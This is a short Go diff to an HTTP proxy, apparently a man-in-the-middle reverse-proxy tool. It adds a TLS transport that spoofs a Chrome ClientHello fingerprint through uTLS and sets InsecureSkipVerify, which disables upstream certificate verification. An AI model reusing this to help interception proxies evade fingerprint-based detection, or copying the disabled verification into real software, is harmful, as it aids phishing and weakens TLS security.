@@ -124,6 +124,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
+		p.Proxy.Tr = &http.Transport{
+			DialTLS: func(network, addr string) (net.Conn, error) {
+				host, _, err := net.SplitHostPort(addr)
+				if err != nil {
+					host = addr
+				}
+				conn, err := net.Dial(network, addr)
+				if err != nil {
+					return nil, err
+				}
+				uConn := utls.UClient(conn, &utls.Config{ServerName: host, InsecureSkipVerify: true}, utls.HelloChrome_Auto)
+				if err := uConn.Handshake(); err != nil {
+					conn.Close()
+					return nil, err
+				}
+				return uConn, nil
+		},
+	}
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
 		Handler:      p.Proxy,
@@ -1542,7 +1560,6 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 		}
 
 		tls_cfg := &tls.Config{}
-		_ = utls.HelloChrome_Auto
 		if !p.developer {
 
 			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
